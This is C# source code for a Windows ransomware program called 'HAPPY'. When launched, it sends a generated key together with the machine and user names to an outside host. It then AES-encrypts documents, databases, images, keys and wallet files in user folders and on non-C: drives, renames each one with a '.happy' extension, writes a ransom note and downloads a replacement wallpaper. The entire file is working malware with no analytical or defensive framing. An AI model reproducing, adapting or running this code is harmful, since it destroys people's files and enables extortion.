using System;
using System.Diagnostics;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Security;
using System.Runtime.InteropServices;
using System.Text.RegularExpressions;
using System.Security.Cryptography;
using System.IO;
using System.Net;
using Microsoft.Win32;

namespace Happy
{
    public partial class Form1 : Form
    {
        string tempat_kirim = "http://ysasite.com/happy/kunjungi.php?masuk=";
        string nama_pengguna    = Environment.UserName;
        string nama_komputer    = System.Environment.MachineName.ToString();
        string folder_user      = "C:\\Users\\";
        string[] semua_drive    = System.IO.Directory.GetLogicalDrives();

        public Form1()
        {
            InitializeComponent();
        }
        public byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
        {
            byte[] encryptedBytes = null;
            byte[] saltBytes = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8 };
            using (MemoryStream ms = new MemoryStream())
            {
                using (RijndaelManaged AES = new RijndaelManaged())
                {
                    AES.KeySize = 256;
                    AES.BlockSize = 128;

                    var key = new Rfc2898DeriveBytes(passwordBytes, saltBytes, 1000);
                    AES.Key = key.GetBytes(AES.KeySize / 8);
                    AES.IV = key.GetBytes(AES.BlockSize / 8);

                    AES.Mode = CipherMode.CBC;

                    using (var cs = new CryptoStream(ms, AES.CreateEncryptor(), CryptoStreamMode.Write))
                    {
                        cs.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
                        cs.Close();
                    }
                    encryptedBytes = ms.ToArray();
                }
            }

            return encryptedBytes;
        }

        public string BuatPwd(int length)
        {
            const string pw_list = "abcdefghijklmnopqrstuvwxyz*!=&?&/ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
            StringBuilder res = new StringBuilder();
            Random rnd = new Random();
            while (0 < length--)
            {
                res.Append(pw_list[rnd.Next(pw_list.Length)]);
            }
            return res.ToString();
        }

        public void KirimPwd(string pwnya)
        {

            string semua    = nama_komputer + "-" + nama_pengguna + " " + pwnya;
            var url_lengkap = tempat_kirim + semua;
            var conent = new System.Net.WebClient().DownloadString(url_lengkap);
        }

        public void EnkripPile(string nama_file, string pwd)
        {

            byte[] bitetoenkrip     = File.ReadAllBytes(nama_file);
            byte[] pwdbite          = Encoding.UTF8.GetBytes(pwd);
            pwdbite                 = SHA256.Create().ComputeHash(pwdbite);
            byte[] bitenkrip        = AES_Encrypt(bitetoenkrip, pwdbite);

            File.WriteAllBytes(nama_file, bitenkrip);
            System.IO.File.Move(nama_file, nama_file + ".happy");        
        }

        public void enkrippolder(string lokasi, string pwd)
        {
            var ekstensinya = new[]
            {
                ".mid", ".wma", ".flv", ".mkv", ".mov", ".avi", ".asf", ".mpeg", ".vob", ".mpg", ".wmv", ".fla", ".swf", ".wav", ".qcow2", ".vdi", ".vmdk", ".vmx", ".gpg", ".aes", ".ARC", ".PAQ", ".tar.bz2", ".tbk", ".bak", ".tar", ".tgz", ".rar", ".zip", ".djv", ".djvu", ".svg", ".bmp", ".png", ".gif", ".raw", ".cgm", ".jpeg", ".jpg", ".tif", ".tiff", ".NEF", ".psd", ".cmd", ".class", ".jar", ".java", ".asp", ".brd", ".sch", ".dch", ".dip", ".vbs", ".asm", ".pas", ".cpp", ".php", ".ldf", ".mdf", ".ibd", ".MYI", ".MYD", ".frm", ".odb", ".dbf", ".mdb", ".sql", ".SQLITEDB", ".SQLITE3", ".asc", ".lay6", ".lay", ".ms11 (Security copy)", ".sldm", ".sldx", ".ppsm", ".ppsx", ".ppam", ".docb", ".mml", ".sxm", ".otg", ".odg", ".uop", ".potx", ".potm", ".pptx", ".pptm", ".std", ".sxd", ".pot", ".pps", ".sti", ".sxi", ".otp", ".odp", ".wks", ".xltx", ".xltm", ".xlsx", ".xlsm", ".xlsb", ".slk", ".xlw", ".xlt", ".xlm", ".xlc", ".dif", ".stc", ".sxc", ".ots", ".ods", ".hwp", ".dotm", ".dotx", ".docm", ".docx", ".DOT", ".max", ".xml", ".txt", ".CSV", ".uot", ".RTF", ".pdf", ".XLS", ".PPT", ".stw", ".sxw", ".ott", ".odt", ".DOC", ".pem", ".csr", ".crt", ".key", " wallet.dat"
            };
            string[] pile = Directory.GetFiles(lokasi);
            string[] anakanpolder = Directory.GetDirectories(lokasi);
            for (int i = 0; i < pile.Length; i++)
            {
                string eksnya = Path.GetExtension(pile[i]);
                if (ekstensinya.Contains(eksnya))
                {
                    EnkripPile(pile[i], pwd);
                }
            }
            for (int i = 0; i < anakanpolder.Length; i++)
            {
                enkrippolder(anakanpolder[i], pwd);
            }
        }

        public void mulai_aksi()
        {
            string pwd              = BuatPwd(12);
            string folder_coba      = "\\Desktop\\coba";
            string lengkap_semua = folder_user + nama_pengguna + folder_coba;
            KirimPwd(pwd);

            string folder_usernya = folder_user + nama_pengguna;
            string[] fileArray = Directory.GetDirectories(folder_usernya);
            for (int i = 0; i < fileArray.Length; i++)
            {
                string[] myStrings = { "Download", "Desktop", "Favorite" };
                if (myStrings.Any(fileArray[i].Contains))
                {
                    //Console.Write(fileArray[i] + "\n");
                    enkrippolder(fileArray[i], pwd);
                }
            }

            //enkrippolder(lengkap_semua, pwd);
            pesan_pesan();

            WebClient t = new WebClient();
            t.DownloadFile(@"http://ysasite.com/happy/bg.png", folder_user + nama_pengguna + "\\Desktop\\bg.png");
            using (var key = Registry.CurrentUser.OpenSubKey(@"Control Panel\Desktop", true)) { key.SetValue("Wallpaper", folder_user + nama_pengguna + "\\Desktop\\bg.png"); }


            
            foreach (string str in semua_drive)
            {
                System.IO.DriveInfo di = new System.IO.DriveInfo(str);
                if (di.IsReady)
                {
                    string[] fileArray1 = Directory.GetDirectories(str);
                    for (int i = 0; i < fileArray1.Length; i++)
                    {
                        //string[] myStrings = {"Documents and Settings","ProgramData","PerfLogs","Recovery","Boot","Windows","winnt","tmp","Program Files (x86)", "Program Files", "temp", "thumbs.db", "Recycle", "System Volume Information"};
                        string[] myStrings = { "C:" };
                        if (!myStrings.Any(fileArray1[i].Contains))
                        {
                            //Console.Write(fileArray[i] + "\n");
                            enkrippolder(fileArray1[i], pwd);
                        }
                    }
                }
            }

            pwd = null;
            System.Windows.Forms.Application.Exit();
        }

        public void pesan_pesan()
        {
            string folder_coba = "\\Desktop\\READDDDDDD.txt";
            string lengkap_semua = folder_user + nama_pengguna + folder_coba;
            string[] lines = { "IMPORTANT INFORMATION!!!!", "All your files are encrypted with HAPPY Ciphers", "To Decrypt :", "- Open This Page : http://ysasite.com/happy/ ", "- Follow All Steps" };
            System.IO.File.WriteAllLines(lengkap_semua, lines);
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            mulai_aksi();
        }
    }
}
